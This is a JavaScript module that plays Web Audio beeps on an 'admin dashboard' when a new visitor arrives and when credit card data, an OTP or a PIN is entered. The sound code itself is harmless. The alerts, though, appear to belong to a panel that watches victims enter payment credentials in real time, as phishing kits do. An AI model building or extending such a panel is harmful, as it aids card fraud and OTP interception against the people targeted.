// Notification Sounds for Admin Dashboard

// Lazy-load audio context (created on first use to avoid Chrome warning)
let audioContext = null;

/**
 * Get or create audio context (initialized after user interaction)
 */
const getAudioContext = () => {
  if (!audioContext && typeof window !== 'undefined') {
    try {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
      
      // Resume if suspended (Chrome autoplay policy)
      if (audioContext.state === 'suspended') {
        audioContext.resume();
      }
    } catch (error) {
      console.warn('AudioContext not supported:', error);
      return null;
    }
  }
  return audioContext;
};

/**
 * Play a beep sound for new visitor
 * Simple notification tone
 */
export const playNewVisitorSound = () => {
  const ctx = getAudioContext();
  if (!ctx) return;
  
  const oscillator = ctx.createOscillator();
  const gainNode = ctx.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(ctx.destination);
  
  oscillator.frequency.value = 800; // Hz
  oscillator.type = 'sine';
  
  gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
  
  oscillator.start(ctx.currentTime);
  oscillator.stop(ctx.currentTime + 0.5);
  
  console.log('🔔 New visitor sound played');
};

/**
 * Play a special sound for credit card data entry
 * Two-tone alert sound
 */
export const playCardDataSound = () => {
  const ctx = getAudioContext();
  if (!ctx) return;
  
  // First tone
  const oscillator1 = ctx.createOscillator();
  const gainNode1 = ctx.createGain();
  
  oscillator1.connect(gainNode1);
  gainNode1.connect(ctx.destination);
  
  oscillator1.frequency.value = 1200; // Higher pitch
  oscillator1.type = 'sine';
  
  gainNode1.gain.setValueAtTime(0.3, ctx.currentTime);
  gainNode1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
  
  oscillator1.start(ctx.currentTime);
  oscillator1.stop(ctx.currentTime + 0.3);
  
  // Second tone (delayed)
  const oscillator2 = ctx.createOscillator();
  const gainNode2 = ctx.createGain();
  
  oscillator2.connect(gainNode2);
  gainNode2.connect(ctx.destination);
  
  oscillator2.frequency.value = 1000; // Slightly lower
  oscillator2.type = 'sine';
  
  gainNode2.gain.setValueAtTime(0.3, ctx.currentTime + 0.35);
  gainNode2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.7);
  
  oscillator2.start(ctx.currentTime + 0.35);
  oscillator2.stop(ctx.currentTime + 0.7);
  
  console.log('💳 Card data sound played');
};

/**
 * Play a special sound for OTP entry
 * Triple beep pattern
 */
export const playOTPSound = () => {
  const ctx = getAudioContext();
  if (!ctx) return;
  
  const beepTimes = [0, 0.2, 0.4];
  
  beepTimes.forEach((time, index) => {
    const oscillator = ctx.createOscillator();
    const gainNode = ctx.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(ctx.destination);
    
    oscillator.frequency.value = 1400;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.25, ctx.currentTime + time);
    gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + time + 0.15);
    
    oscillator.start(ctx.currentTime + time);
    oscillator.stop(ctx.currentTime + time + 0.15);
  });
  
  console.log('🔐 OTP sound played');
};

/**
 * Play a special sound for PIN entry
 * Deep double beep
 */
export const playPINSound = () => {
  const ctx = getAudioContext();
  if (!ctx) return;
  
  const oscillator1 = ctx.createOscillator();
  const gainNode1 = ctx.createGain();
  
  oscillator1.connect(gainNode1);
  gainNode1.connect(ctx.destination);
  
  oscillator1.frequency.value = 600; // Lower pitch
  oscillator1.type = 'square';
  
  gainNode1.gain.setValueAtTime(0.2, ctx.currentTime);
  gainNode1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
  
  oscillator1.start(ctx.currentTime);
  oscillator1.stop(ctx.currentTime + 0.25);
  
  // Second beep
  const oscillator2 = ctx.createOscillator();
  const gainNode2 = ctx.createGain();
  
  oscillator2.connect(gainNode2);
  gainNode2.connect(ctx.destination);
  
  oscillator2.frequency.value = 600;
  oscillator2.type = 'square';
  
  gainNode2.gain.setValueAtTime(0.2, ctx.currentTime + 0.3);
  gainNode2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.55);
  
  oscillator2.start(ctx.currentTime + 0.3);
  oscillator2.stop(ctx.currentTime + 0.55);
  
  console.log('🔑 PIN sound played');
};

/**
 * Initialize audio context (must be called after user interaction)
 */
export const initAudioContext = () => {
  const ctx = getAudioContext();
  if (ctx && ctx.state === 'suspended') {
    ctx.resume();
  }
};
